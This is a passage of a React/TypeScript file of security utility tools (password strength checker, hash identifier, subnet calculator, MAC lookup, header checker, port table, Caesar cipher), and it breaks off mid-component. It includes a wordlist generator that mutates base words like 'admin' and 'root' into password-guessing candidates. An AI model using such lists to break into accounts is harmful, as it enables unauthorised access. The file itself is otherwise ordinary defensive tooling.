import { useState, useMemo } from 'react';
import { ToolInput, ToolButton, ToolError, CopyButton } from '@/components/ToolUI';
import { Lock, Fingerprint, Network, Cpu, ShieldCheck, Plug, List, Bug, Database, ArrowDownToLine, Search } from 'lucide-react';

// === Password Strength Analyzer ===
export function PasswordStrengthAnalyzer() {
  const [password, setPassword] = useState('');
  const [show, setShow] = useState(false);

  const analysis = useMemo(() => {
    if (!password) return null;
    let score = 0;
    const checks: { label: string; passed: boolean; weight: number }[] = [];
    const hasLower = /[a-z]/.test(password);
    const hasUpper = /[A-Z]/.test(password);
    const hasDigit = /\d/.test(password);
    const hasSpecial = /[^a-zA-Z0-9]/.test(password);
    const isLong = password.length >= 12;
    const isVeryLong = password.length >= 16;
    checks.push({ label: 'Contains lowercase letters', passed: hasLower, weight: 1 });
    checks.push({ label: 'Contains uppercase letters', passed: hasUpper, weight: 1 });
    checks.push({ label: 'Contains numbers', passed: hasDigit, weight: 1 });
    checks.push({ label: 'Contains special characters', passed: hasSpecial, weight: 2 });
    checks.push({ label: 'At least 12 characters long', passed: isLong, weight: 2 });
    checks.push({ label: 'At least 16 characters long', passed: isVeryLong, weight: 2 });
    checks.forEach((c) => { if (c.passed) score += c.weight; });
    const charsetSize = (hasLower ? 26 : 0) + (hasUpper ? 26 : 0) + (hasDigit ? 10 : 0) + (hasSpecial ? 32 : 0);
    const entropy = password.length * Math.log2(charsetSize || 1);
    let crackTime = 'Instant';
    const guessesPerSec = 1e10;
    const totalGuesses = Math.pow(2, entropy);
    const seconds = totalGuesses / guessesPerSec;
    if (seconds < 1) crackTime = 'Instant';
    else if (seconds < 60) crackTime = `${Math.round(seconds)} seconds`;
    else if (seconds < 3600) crackTime = `${Math.round(seconds / 60)} minutes`;
    else if (seconds < 86400) crackTime = `${Math.round(seconds / 3600)} hours`;
    else if (seconds < 31536000) crackTime = `${Math.round(seconds / 86400)} days`;
    else if (seconds < 31536000 * 100) crackTime = `${Math.round(seconds / 31536000)} years`;
    else if (seconds < 31536000 * 1e6) crackTime = `${Math.round(seconds / 31536000 / 100)} centuries`;
    else crackTime = 'Millions of years+';
    let strength = 'Very Weak'; let color = '#F87171';
    if (score >= 9) { strength = 'Very Strong'; color = '#34D399'; }
    else if (score >= 7) { strength = 'Strong'; color = '#60A5FA'; }
    else if (score >= 5) { strength = 'Medium'; color = '#FBBF24'; }
    else if (score >= 3) { strength = 'Weak'; color = '#FB923C'; }
    return { score, checks, entropy: Math.round(entropy * 10) / 10, crackTime, strength, color, maxScore: 9 };
  }, [password]);

  return (
    <div className="space-y-6">
      <div>
        <label className="block text-sm font-medium text-slate-300 mb-2">Password to Analyze</label>
        <div className="flex gap-3">
          <input
            type={show ? 'text' : 'password'}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Enter a password to analyze..."
            className="flex-1 rounded-lg bg-slate-900 border border-slate-700 px-4 py-2.5 text-white font-mono focus:outline-none focus:ring-2 focus:ring-cyan-400/40"
          />
          <button onClick={() => setShow(!show)} className="px-4 py-2.5 rounded-lg bg-slate-700 text-slate-300 hover:bg-slate-600 text-sm font-medium">
            {show ? 'Hide' : 'Show'}
          </button>
        </div>
      </div>
      {analysis && (
        <>
          <div className="rounded-xl p-5 text-center" style={{ backgroundColor: analysis.color + '15', border: `1px solid ${analysis.color}40` }}>
            <div className="text-3xl font-bold mb-1" style={{ color: analysis.color }}>{analysis.strength}</div>
            <div className="grid grid-cols-2 gap-4 mt-4">
              <div>
                <div className="text-sm text-slate-400">Entropy</div>
                <div className="text-lg font-bold text-white">{analysis.entropy} bits</div>
              </div>
              <div>
                <div className="text-sm text-slate-400">Est. Crack Time</div>
                <div className="text-lg font-bold text-white">{analysis.crackTime}</div>
              </div>
            </div>
            <div className="mt-4 h-2 rounded-full bg-slate-800 overflow-hidden">
              <div className="h-full rounded-full transition-all duration-500" style={{ width: `${(analysis.score / analysis.maxScore) * 100}%`, backgroundColor: analysis.color }} />
            </div>
          </div>
          <div className="space-y-2">
            {analysis.checks.map((c, i) => (
              <div key={i} className="flex items-center gap-3 text-sm">
                <span className={`w-5 h-5 rounded-full flex items-center justify-center text-xs ${c.passed ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'}`}>
                  {c.passed ? '+' : 'x'}
                </span>
                <span className={c.passed ? 'text-slate-300' : 'text-slate-500'}>{c.label}</span>
              </div>
            ))}
          </div>
        </>
      )}
    </div>
  );
}

// === Hash Identifier ===
const HASH_TYPES: { name: string; regex: RegExp; len: number }[] = [
  { name: 'MD5 (32 hex chars)', regex: /^[a-f0-9]{32}$/, len: 32 },
  { name: 'MD4 (32 hex chars)', regex: /^[a-f0-9]{32}$/, len: 32 },
  { name: 'NTLM (32 hex chars)', regex: /^[a-f0-9]{32}$/, len: 32 },
  { name: 'SHA-1 (40 hex chars)', regex: /^[a-f0-9]{40}$/, len: 40 },
  { name: 'SHA-224 (56 hex chars)', regex: /^[a-f0-9]{56}$/, len: 56 },
  { name: 'SHA-256 (64 hex chars)', regex: /^[a-f0-9]{64}$/, len: 64 },
  { name: 'SHA-384 (96 hex chars)', regex: /^[a-f0-9]{96}$/, len: 96 },
  { name: 'SHA-512 (128 hex chars)', regex: /^[a-f0-9]{128}$/, len: 128 },
  { name: 'RIPEMD-160 (40 hex chars)', regex: /^[a-f0-9]{40}$/, len: 40 },
  { name: 'SHA3-256 (64 hex chars)', regex: /^[a-f0-9]{64}$/, len: 64 },
  { name: 'SHA3-512 (128 hex chars)', regex: /^[a-f0-9]{128}$/, len: 128 },
  { name: 'MySQL 323 (16 hex chars)', regex: /^[a-f0-9]{16}$/, len: 16 },
  { name: 'MySQL 5 / SHA1(SHA1) (40 hex chars)', regex: /^\*[a-f0-9]{40}$/, len: 42 },
  { name: 'bcrypt ($2a$/$2b$/$2y$)', regex: /^\$2[abxy]\$\d{2}\$[./A-Za-z0-9]{53}$/, len: 60 },
  { name: 'argon2 ($argon2id$)', regex: /^\$argon2(id|d|i)\$/, len: 0 },
  { name: 'scrypt ($scrypt$)', regex: /^\$scrypt\$/, len: 0 },
  { name: 'PBKDF2 ($pbkdf2$)', regex: /^\$pbkdf2/, len: 0 },
  { name: 'NT Hash (NTLM)', regex: /^[a-f0-9]{32}$/, len: 32 },
  { name: 'Cisco Type 7', regex: /^[0-9a-f]{4,}$/i, len: 0 },
  { name: 'JWT (eyJ...)', regex: /^eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+$/, len: 0 },
];

export function HashIdentifier() {
  const [input, setInput] = useState('');
  const [results, setResults] = useState<string[]>([]);

  const identify = () => {
    const trimmed = input.trim();
    if (!trimmed) { setResults([]); return; }
    const matches: string[] = [];
    for (const ht of HASH_TYPES) {
      if (ht.regex.test(trimmed)) matches.push(ht.name);
    }
    if (matches.length === 0) {
      const len = trimmed.length;
      setResults([`No known hash format matched. Length: ${len} characters.`]);
    } else {
      setResults(matches);
    }
  };

  return (
    <div className="space-y-6">
      <ToolInput label="Hash to Identify" value={input} onChange={setInput} placeholder="5d41402abc4b2a76b9719d911017c592" rows={2} mono />
      <ToolButton onClick={identify} disabled={!input.trim()}>
        <span className="flex items-center gap-2"><Fingerprint className="h-4 w-4" /> Identify Hash</span>
      </ToolButton>
      {results.length > 0 && (
        <div className="rounded-lg bg-slate-900 border border-slate-700 p-4">
          <div className="text-sm text-slate-400 mb-2">Possible hash type{results.length > 1 ? 's' : ''} ({results.length}):</div>
          <div className="space-y-2">
            {results.map((r, i) => (
              <div key={i} className="flex items-center gap-3 rounded-lg bg-slate-800/50 px-4 py-2.5">
                <Fingerprint className="h-4 w-4 text-cyan-400 shrink-0" />
                <span className="text-sm text-slate-200">{r}</span>
              </div>
            ))}
          </div>
          {results.length > 1 && <p className="text-xs text-slate-500 mt-3">Multiple formats can share the same length. Use context or tool-specific prefixes to narrow down.</p>}
        </div>
      )}
    </div>
  );
}

// === Subnet Calculator ===
export function SubnetCalculator() {
  const [input, setInput] = useState('');
  const [result, setResult] = useState<{
    network: string; broadcast: string; firstHost: string; lastHost: string;
    wildcard: string; mask: string; hosts: number; cidr: number; class: string;
  } | null>(null);
  const [error, setError] = useState('');

  const calculate = () => {
    const trimmed = input.trim();
    if (!trimmed) { setError('Enter an IP/CIDR like 192.168.1.0/24'); return; }
    const parts = trimmed.split('/');
    if (parts.length !== 2) { setError('Include the CIDR prefix, e.g. 192.168.1.0/24'); return; }
    const ip = parts[0].split('.').map(Number);
    const cidr = parseInt(parts[1], 10);
    if (ip.length !== 4 || ip.some((o) => isNaN(o) || o < 0 || o > 255) || isNaN(cidr) || cidr < 0 || cidr > 32) {
      setError('Invalid IP address or CIDR.'); return;
    }
    setError('');
    const ipInt = (ip[0] << 24) | (ip[1] << 16) | (ip[2] << 8) | ip[3];
    const maskInt = cidr === 0 ? 0 : (0xFFFFFFFF << (32 - cidr)) >>> 0;
    const wildcardInt = (~maskInt) >>> 0;
    const networkInt = (ipInt & maskInt) >>> 0;
    const broadcastInt = (networkInt | wildcardInt) >>> 0;
    const firstHost = cidr === 32 ? networkInt : (networkInt + 1) >>> 0;
    const lastHost = cidr === 32 ? networkInt : (broadcastInt - 1) >>> 0;
    const hosts = cidr >= 31 ? (cidr === 31 ? 2 : 1) : (Math.pow(2, 32 - cidr) - 2);
    const intToIp = (n: number) => `${(n >>> 24) & 255}.${(n >> 16) & 255}.${(n >> 8) & 255}.${n & 255}`;
    let ipClass = 'C';
    const first = ip[0];
    if (first >= 1 && first <= 126) ipClass = 'A';
    else if (first >= 128 && first <= 191) ipClass = 'B';
    else if (first >= 192 && first <= 223) ipClass = 'C';
    else if (first >= 224 && first <= 239) ipClass = 'D (Multicast)';
    else if (first >= 240) ipClass = 'E (Reserved)';
    setResult({
      network: intToIp(networkInt), broadcast: intToIp(broadcastInt),
      firstHost: intToIp(firstHost), lastHost: intToIp(lastHost),
      wildcard: intToIp(wildcardInt), mask: intToIp(maskInt),
      hosts, cidr, class: ipClass,
    });
  };

  return (
    <div className="space-y-6">
      <ToolInput label="IP Address / CIDR" value={input} onChange={setInput} placeholder="192.168.1.0/24" rows={1} mono />
      <ToolButton onClick={calculate}><span className="flex items-center gap-2"><Network className="h-4 w-4" /> Calculate</span></ToolButton>
      {error && <ToolError message={error} />}
      {result && (
        <div className="grid grid-cols-2 gap-3">
          {[
            { label: 'Network Address', value: result.network },
            { label: 'Broadcast Address', value: result.broadcast },
            { label: 'Subnet Mask', value: result.mask },
            { label: 'Wildcard Mask', value: result.wildcard },
            { label: 'First Host', value: result.firstHost },
            { label: 'Last Host', value: result.lastHost },
            { label: 'Total Usable Hosts', value: result.hosts.toLocaleString() },
            { label: 'IP Class', value: result.class },
          ].map((r) => (
            <div key={r.label} className="rounded-lg bg-slate-900 border border-slate-700 px-4 py-3">
              <div className="text-xs text-slate-400">{r.label}</div>
              <div className="text-sm font-mono text-cyan-300 mt-1">{r.value}</div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

// === MAC Vendor Lookup ===
const MAC_VENDORS: Record<string, string> = {
  '00:0C:29': 'VMware, Inc.',
  '00:50:56': 'VMware, Inc.',
  '00:1B:21': 'Intel Corporation',
  '08:00:27': 'PCS Systemtechnik GmbH (VirtualBox)',
  '00:1C:42': 'Parallels, Inc.',
  '00:15:5D': 'Microsoft Corporation (Hyper-V)',
  'F0:1F:AF': 'Dell Inc.',
  '00:1D:09': 'Dell Inc.',
  'B8:CA:3A': 'Dell Inc.',
  '00:1E:C9': 'Intel Corporation',
  '00:25:9B': 'Intel Corporation',
  '3C:5A:B4': 'Apple, Inc.',
  'AC:DE:48': 'Apple, Inc.',
  '00:1F:F3': 'Apple, Inc.',
  '00:24:E8': 'Apple, Inc.',
  'D8:30:62': 'Apple, Inc.',
  '00:0A:95': 'Apple, Inc.',
  '00:1F:3C': 'Apple, Inc.',
  'EC:35:86': 'Apple, Inc.',
  '00:1A:11': 'Google, Inc.',
  'FA:8F:CA': 'Google, Inc.',
  '00:1A:A0': 'Google, Inc.',
  '00:0A:EB': 'Huawei Technologies Co.,Ltd',
  '00:25:9E': 'Huawei Technologies Co.,Ltd',
  '00:E0:FC': 'Huawei Technologies Co.,Ltd',
  '00:18:82': 'Cisco Systems, Inc',
  '00:1F:9E': 'Cisco Systems, Inc',
  '00:CD:FE': 'Cisco Systems, Inc',
  '00:1B:54': 'Cisco Systems, Inc',
  '00:14:2D': 'Cisco Systems, Inc',
  '00:0B:BE': 'Cisco Systems, Inc',
  '00:1E:BD': 'Cisco Systems, Inc',
  '00:13:19': 'Cisco Systems, Inc',
  '00:0F:24': 'Cisco Systems, Inc',
  '00:14:A8': 'Netgear',
  '00:1F:33': 'Netgear',
  '00:1B:2F': 'Netgear',
  '00:0F:B5': 'Netgear',
  'C0:3F:0E': 'Netgear',
  '00:09:5B': 'Netgear',
  '00:1B:11': 'D-Link Systems',
  '00:13:46': 'D-Link Systems',
  '00:0F:3D': 'D-Link Systems',
  '00:15:E9': 'D-Link Systems',
  '00:18:5E': 'D-Link Systems',
  '00:24:01': 'D-Link Systems',
  '00:14:6C': 'Netgear',
  '00:04:ED': 'ASUSTek Computer Inc.',
  '00:1A:92': 'ASUSTek Computer Inc.',
  '00:0C:6E': 'ASUSTek Computer Inc.',
  '00:E0:4C': 'Realtek Semiconductor Corp.',
  '00:13:D4': 'Realtek Semiconductor Corp.',
  '52:54:00': 'QEMU (fake NIC)',
  '00:16:3E': 'XenSource, Inc.',
  '00:1C:7E': 'XenSource, Inc.',
  '00:1A:4A': 'Juniper Networks',
  '00:05:85': 'Juniper Networks',
  '00:90:0B': 'Juniper Networks',
  '00:12:1E': 'Juniper Networks',
  '00:1B:C5': 'Fortinet, Inc.',
  '00:09:0F': 'Fortinet, Inc.',
  '00:1E:67': 'Samsung Electronics Co.,Ltd',
  '00:12:47': 'Samsung Electronics Co.,Ltd',
  '00:15:99': 'Samsung Electronics Co.,Ltd',
  '5C:5F:67': 'Samsung Electronics Co.,Ltd',
  '00:26:37': 'Microsoft Corporation',
  '00:03:FF': 'Microsoft Corporation',
  '00:0F:28': 'Microsoft Corporation',
  '00:17:FA': 'Microsoft Corporation',
  '00:1D:D8': 'Microsoft Corporation',
  '00:25:9F': 'Microsoft Corporation',
  '00:14:4F': 'Sun Microsystems, Inc',
  '00:0E:0C': 'Sun Microsystems, Inc',
  '00:1B:24': 'Sun Microsystems, Inc',
  '00:21:28': 'Oracle Corporation',
  '00:21:F6': 'Oracle Corporation',
};

export function MACVendorLookup() {
  const [input, setInput] = useState('');
  const [result, setResult] = useState<{ vendor: string; oui: string } | null>(null);
  const [error, setError] = useState('');

  const lookup = () => {
    const raw = input.trim().toUpperCase().replace(/[:.\-]/g, '');
    if (raw.length < 6 || !/^[0-9A-F]+$/.test(raw)) {
      setError('Please enter a valid MAC address (e.g. 00:0C:29:8A:1B:2C).'); setResult(null); return;
    }
    setError('');
    const oui = raw.slice(0, 6);
    const formattedOui = `${oui.slice(0, 2)}:${oui.slice(2, 4)}:${oui.slice(4, 6)}`;
    const vendor = MAC_VENDORS[formattedOui];
    if (vendor) {
      setResult({ vendor, oui: formattedOui });
    } else {
      setResult({ vendor: 'Unknown vendor (not in local database)', oui: formattedOui });
    }
  };

  return (
    <div className="space-y-6">
      <ToolInput label="MAC Address" value={input} onChange={setInput} placeholder="00:0C:29:8A:1B:2C" rows={1} mono />
      <ToolButton onClick={lookup}><span className="flex items-center gap-2"><Cpu className="h-4 w-4" /> Look Up Vendor</span></ToolButton>
      {error && <ToolError message={error} />}
      {result && (
        <div className="rounded-lg bg-slate-900 border border-slate-700 px-6 py-4">
          <div className="grid grid-cols-2 gap-4">
            <div>
              <div className="text-xs text-slate-400">OUI (Organizationally Unique Identifier)</div>
              <div className="text-lg font-mono text-cyan-300 mt-1">{result.oui}</div>
            </div>
            <div>
              <div className="text-xs text-slate-400">Manufacturer</div>
              <div className="text-lg text-white mt-1">{result.vendor}</div>
            </div>
          </div>
        </div>
      )}
      <p className="text-xs text-slate-500">Uses a built-in database of common vendor OUI prefixes. For comprehensive lookups, use the IEEE OUI registry.</p>
    </div>
  );
}

// === Security Headers Checker ===
export function SecurityHeadersChecker() {
  const [url, setUrl] = useState('');
  const [results, setResults] = useState<{ header: string; present: boolean; value: string; severity: string }[] | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const check = async () => {
    let target = url.trim();
    if (!target) { setError('Please enter a URL.'); return; }
    if (!target.startsWith('http')) target = 'https://' + target;
    setLoading(true); setError(''); setResults(null);
    try {
      const response = await fetch(target, { method: 'GET', mode: 'cors' });
      const headers = response.headers;
      const checks = [
        { header: 'Content-Security-Policy', severity: 'high' },
        { header: 'Strict-Transport-Security', severity: 'high' },
        { header: 'X-Frame-Options', severity: 'medium' },
        { header: 'X-Content-Type-Options', severity: 'medium' },
        { header: 'Referrer-Policy', severity: 'low' },
        { header: 'Permissions-Policy', severity: 'low' },
        { header: 'X-XSS-Protection', severity: 'low' },
        { header: 'Cross-Origin-Opener-Policy', severity: 'low' },
        { header: 'Cross-Origin-Embedder-Policy', severity: 'low' },
      ];
      const results = checks.map((c) => {
        const value = headers.get(c.header.toLowerCase());
        return { header: c.header, present: !!value, value: value || 'Not set', severity: c.severity };
      });
      setResults(results);
    } catch {
      setError('Could not fetch headers. The site may block cross-origin requests (CORS). This is common and does not mean the site is insecure.');
    }
    setLoading(false);
  };

  const severityColor = (s: string) => s === 'high' ? '#F87171' : s === 'medium' ? '#FBBF24' : '#60A5FA';

  return (
    <div className="space-y-6">
      <ToolInput label="Website URL" value={url} onChange={setUrl} placeholder="example.com" rows={1} />
      <ToolButton onClick={check} disabled={loading || !url.trim()}>
        <span className="flex items-center gap-2"><ShieldCheck className="h-4 w-4" /> {loading ? 'Checking...' : 'Check Headers'}</span>
      </ToolButton>
      {error && <ToolError message={error} />}
      {results && (
        <div className="space-y-2">
          {results.map((r) => (
            <div key={r.header} className="rounded-lg bg-slate-900 border border-slate-700 px-4 py-3">
              <div className="flex items-center gap-3 mb-1">
                <span className={`px-2 py-0.5 rounded text-xs font-medium ${r.present ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'}`}>
                  {r.present ? 'Present' : 'Missing'}
                </span>
                <span className="text-sm font-medium text-white">{r.header}</span>
                <span className="ml-auto text-xs px-2 py-0.5 rounded" style={{ color: severityColor(r.severity), backgroundColor: severityColor(r.severity) + '20' }}>
                  {r.severity}
                </span>
              </div>
              <div className="text-xs text-slate-400 font-mono break-all">{r.value}</div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

// === Port Reference ===
const PORTS: { port: number; protocol: string; service: string; description: string }[] = [
  { port: 20, protocol: 'TCP', service: 'FTP Data', description: 'File Transfer Protocol data transfer' },
  { port: 21, protocol: 'TCP', service: 'FTP', description: 'File Transfer Protocol control' },
  { port: 22, protocol: 'TCP', service: 'SSH', description: 'Secure Shell remote login' },
  { port: 23, protocol: 'TCP', service: 'Telnet', description: 'Unencrypted remote login' },
  { port: 25, protocol: 'TCP', service: 'SMTP', description: 'Simple Mail Transfer Protocol' },
  { port: 53, protocol: 'TCP/UDP', service: 'DNS', description: 'Domain Name System' },
  { port: 67, protocol: 'UDP', service: 'DHCP Server', description: 'Dynamic Host Configuration Protocol server' },
  { port: 68, protocol: 'UDP', service: 'DHCP Client', description: 'Dynamic Host Configuration Protocol client' },
  { port: 69, protocol: 'UDP', service: 'TFTP', description: 'Trivial File Transfer Protocol' },
  { port: 80, protocol: 'TCP', service: 'HTTP', description: 'HyperText Transfer Protocol' },
  { port: 110, protocol: 'TCP', service: 'POP3', description: 'Post Office Protocol v3' },
  { port: 111, protocol: 'TCP/UDP', service: 'RPC', description: 'Remote Procedure Call (portmapper)' },
  { port: 119, protocol: 'TCP', service: 'NNTP', description: 'Network News Transfer Protocol' },
  { port: 123, protocol: 'UDP', service: 'NTP', description: 'Network Time Protocol' },
  { port: 135, protocol: 'TCP', service: 'MS-RPC', description: 'Microsoft RPC endpoint mapper' },
  { port: 137, protocol: 'UDP', service: 'NetBIOS Name', description: 'NetBIOS name service' },
  { port: 138, protocol: 'UDP', service: 'NetBIOS Datagram', description: 'NetBIOS datagram service' },
  { port: 139, protocol: 'TCP', service: 'NetBIOS Session', description: 'NetBIOS session service (SMB)' },
  { port: 143, protocol: 'TCP', service: 'IMAP', description: 'Internet Message Access Protocol' },
  { port: 161, protocol: 'UDP', service: 'SNMP', description: 'Simple Network Management Protocol' },
  { port: 162, protocol: 'UDP', service: 'SNMP Trap', description: 'SNMP trap' },
  { port: 389, protocol: 'TCP', service: 'LDAP', description: 'Lightweight Directory Access Protocol' },
  { port: 443, protocol: 'TCP', service: 'HTTPS', description: 'HTTP Secure (TLS)' },
  { port: 445, protocol: 'TCP', service: 'SMB', description: 'Server Message Block (file sharing)' },
  { port: 465, protocol: 'TCP', service: 'SMTPS', description: 'SMTP over SSL' },
  { port: 514, protocol: 'UDP', service: 'Syslog', description: 'System logging' },
  { port: 587, protocol: 'TCP', service: 'SMTP Submission', description: 'SMTP message submission' },
  { port: 636, protocol: 'TCP', service: 'LDAPS', description: 'LDAP over SSL' },
  { port: 873, protocol: 'TCP', service: 'rsync', description: 'Remote sync file transfer' },
  { port: 993, protocol: 'TCP', service: 'IMAPS', description: 'IMAP over SSL' },
  { port: 995, protocol: 'TCP', service: 'POP3S', description: 'POP3 over SSL' },
  { port: 1080, protocol: 'TCP', service: 'SOCKS', description: 'SOCKS proxy' },
  { port: 1433, protocol: 'TCP', service: 'MSSQL', description: 'Microsoft SQL Server' },
  { port: 1521, protocol: 'TCP', service: 'Oracle DB', description: 'Oracle database listener' },
  { port: 1723, protocol: 'TCP', service: 'PPTP', description: 'Point-to-Point Tunneling Protocol VPN' },
  { port: 2049, protocol: 'TCP/UDP', service: 'NFS', description: 'Network File System' },
  { port: 3306, protocol: 'TCP', service: 'MySQL', description: 'MySQL database' },
  { port: 3389, protocol: 'TCP', service: 'RDP', description: 'Remote Desktop Protocol' },
  { port: 5432, protocol: 'TCP', service: 'PostgreSQL', description: 'PostgreSQL database' },
  { port: 5900, protocol: 'TCP', service: 'VNC', description: 'Virtual Network Computing' },
  { port: 6379, protocol: 'TCP', service: 'Redis', description: 'Redis key-value store' },
  { port: 8080, protocol: 'TCP', service: 'HTTP Alt', description: 'Alternative HTTP port' },
  { port: 8443, protocol: 'TCP', service: 'HTTPS Alt', description: 'Alternative HTTPS port' },
  { port: 9090, protocol: 'TCP', service: 'Prometheus', description: 'Prometheus monitoring' },
  { port: 27017, protocol: 'TCP', service: 'MongoDB', description: 'MongoDB database' },
];

export function PortReference() {
  const [search, setSearch] = useState('');
  const filtered = PORTS.filter((p) =>
    p.port.toString().includes(search) ||
    p.service.toLowerCase().includes(search.toLowerCase()) ||
    p.description.toLowerCase().includes(search.toLowerCase())
  );

  return (
    <div className="space-y-6">
      <div className="flex items-center gap-2">
        <Search className="h-4 w-4 text-slate-500" />
        <input type="text" value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Search by port, service, or description..."
          className="flex-1 rounded-lg bg-slate-900 border border-slate-700 px-4 py-2.5 text-white focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
      </div>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-slate-700">
              <th className="text-left px-3 py-2 text-slate-400 font-medium">Port</th>
              <th className="text-left px-3 py-2 text-slate-400 font-medium">Protocol</th>
              <th className="text-left px-3 py-2 text-slate-400 font-medium">Service</th>
              <th className="text-left px-3 py-2 text-slate-400 font-medium">Description</th>
            </tr>
          </thead>
          <tbody>
            {filtered.map((p) => (
              <tr key={`${p.port}-${p.protocol}`} className="border-b border-slate-800 hover:bg-slate-800/30">
                <td className="px-3 py-2.5 font-mono text-cyan-300 font-bold">{p.port}</td>
                <td className="px-3 py-2.5 text-slate-400 text-xs">{p.protocol}</td>
                <td className="px-3 py-2.5 text-white font-medium">{p.service}</td>
                <td className="px-3 py-2.5 text-slate-400 text-xs">{p.description}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
      {filtered.length === 0 && <p className="text-center text-sm text-slate-500">No ports found.</p>}
    </div>
  );
}

// === Wordlist Generator ===
export function WordlistGenerator() {
  const [base, setBase] = useState('');
  const [leetspeak, setLeetspeak] = useState(true);
  const [caseVariants, setCaseVariants] = useState(true);
  const [appendNumbers, setAppendNumbers] = useState(true);
  const [appendSpecial, setAppendSpecial] = useState(false);
  const [minNum, setMinNum] = useState(1);
  const [maxNum, setMaxNum] = useState(99);
  const [output, setOutput] = useState('');
  const [count, setCount] = useState(0);

  const generate = () => {
    const baseWords = base.split(/[,\n]/).map((w) => w.trim()).filter(Boolean);
    if (baseWords.length === 0) return;
    const words = new Set<string>();
    baseWords.forEach((word) => {
      words.add(word);
      if (caseVariants) {
        words.add(word.toLowerCase());
        words.add(word.toUpperCase());
        words.add(word.charAt(0).toUpperCase() + word.slice(1).toLowerCase());
      }
      if (leetspeak) {
        const leet = word
          .replace(/a/gi, '@').replace(/e/gi, '3')
          .replace(/i/gi, '1').replace(/o/gi, '0')
          .replace(/s/gi, '$').replace(/t/gi, '7');
        words.add(leet);
        if (caseVariants) {
          words.add(leet.toUpperCase());
          words.add(leet.toLowerCase());
        }
      }
    });
    const final = new Set<string>();
    const suffixes = [''];
    if (appendNumbers) {
      for (let i = minNum; i <= maxNum; i++) suffixes.push(i.toString());
      suffixes.push('123', '1234', '12345', '123456', '111', '000', '007', '69', '420', '666', '777', '2024', '2025', '2026', '1!', '12!');
    }
    if (appendSpecial) {
      ['!', '!!', '@', '#', '$', '!!', '@#', '#1'].forEach((s) => suffixes.push(s));
    }
    words.forEach((word) => {
      suffixes.forEach((suffix) => final.add(word + suffix));
    });
    const result = Array.from(final).sort().join('\n');
    setOutput(result);
    setCount(final.size);
  };

  return (
    <div className="space-y-6">
      <ToolInput label="Base Words (comma or newline separated)" value={base} onChange={setBase} placeholder="admin, password, root, user" rows={3} />
      <div className="grid grid-cols-2 gap-3">
        <label className="flex items-center gap-2 text-sm text-slate-300 cursor-pointer">
          <input type="checkbox" checked={leetspeak} onChange={(e) => setLeetspeak(e.target.checked)} className="accent-cyan-400" /> Leetspeak mutations
        </label>
        <label className="flex items-center gap-2 text-sm text-slate-300 cursor-pointer">
          <input type="checkbox" checked={caseVariants} onChange={(e) => setCaseVariants(e.target.checked)} className="accent-cyan-400" /> Case variants
        </label>
        <label className="flex items-center gap-2 text-sm text-slate-300 cursor-pointer">
          <input type="checkbox" checked={appendNumbers} onChange={(e) => setAppendNumbers(e.target.checked)} className="accent-cyan-400" /> Append numbers
        </label>
        <label className="flex items-center gap-2 text-sm text-slate-300 cursor-pointer">
          <input type="checkbox" checked={appendSpecial} onChange={(e) => setAppendSpecial(e.target.checked)} className="accent-cyan-400" /> Append special chars
        </label>
      </div>
      {appendNumbers && (
        <div className="flex items-center gap-4">
          <div>
            <label className="block text-xs text-slate-400 mb-1">Number range</label>
            <div className="flex items-center gap-2">
              <input type="number" min={0} value={minNum} onChange={(e) => setMinNum(+e.target.value)} className="w-20 rounded-lg bg-slate-900 border border-slate-700 px-3 py-2 text-white text-center focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
              <span className="text-slate-500">to</span>
              <input type="number" min={0} value={maxNum} onChange={(e) => setMaxNum(Math.max(minNum, +e.target.value))} className="w-20 rounded-lg bg-slate-900 border border-slate-700 px-3 py-2 text-white text-center focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
            </div>
          </div>
        </div>
      )}
      <ToolButton onClick={generate} disabled={!base.trim()}>
        <span className="flex items-center gap-2"><List className="h-4 w-4" /> Generate Wordlist</span>
      </ToolButton>
      {count > 0 && (
        <div className="text-sm text-cyan-400">{count.toLocaleString()} entries generated</div>
      )}
      {output && (
        <>
          <ToolInput label="Generated Wordlist" value={output} onChange={() => {}} rows={10} readOnly mono />
          <CopyButton text={output} />
        </>
      )}
    </div>
  );
}

// === Caesar Cipher ===
export function CaesarCipher() {
  const [input, setInput] = useState('');
  const [shift, setShift] = useState(3);
  const [mode, setMode] = useState<'encrypt' | 'decrypt'>('encrypt');
  const [output, setOutput] = useState('');

  const process = () => {
    const actualShift = mode === 'decrypt' ? (26 - (shift % 26)) : (shift % 26);
    const result = [...input].map((char) => {
      const code = char.charCodeAt(0);
      if (code >= 65 && code <= 90) return String.fromCharCode(((code - 65 + actualShift) % 26) + 65);
      if (code >= 97 && code <= 122) return String.fromCharCode(((code - 97 + actualShift) % 26) + 97);
      return char;
    }).join('');
    setOutput(result);
  };

  return (
    <div className="space-y-6">
      <ToolInput label="Input Text" value={input} onChange={setInput} placeholder="Enter text to encrypt or decrypt..." rows={4} />
      <div className="flex items-end gap-4">
        <div className="flex gap-2">
          <button onClick={() => setMode('encrypt')} className={`px-4 py-2 rounded-lg text-sm font-medium ${mode === 'encrypt' ? 'bg-cyan-500 text-white' : 'bg-slate-700 text-slate-300 hover:bg-slate-600'}`}>Encrypt</button>
          <button onClick={() => setMode('decrypt')} className={`px-4 py-2 rounded-lg text-sm font-medium ${mode === 'decrypt' ? 'bg-cyan-500 text-white' : 'bg-slate-700 text-slate-300 hover:bg-slate-600'}`}>Decrypt</button>
        </div>
        <div>
          <label className="block text-xs text-slate-400 mb-1">Shift (1-25)</label>
          <input type="number" min={1} max={25} value={shift} onChange={(e) => setShift(Math.max(1, Math.min(25, +e.target.value)))} className="w-20 rounded-lg bg-slate-900 border border-slate-700 px-3 py-2.5 text-white text-center focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
        </div>
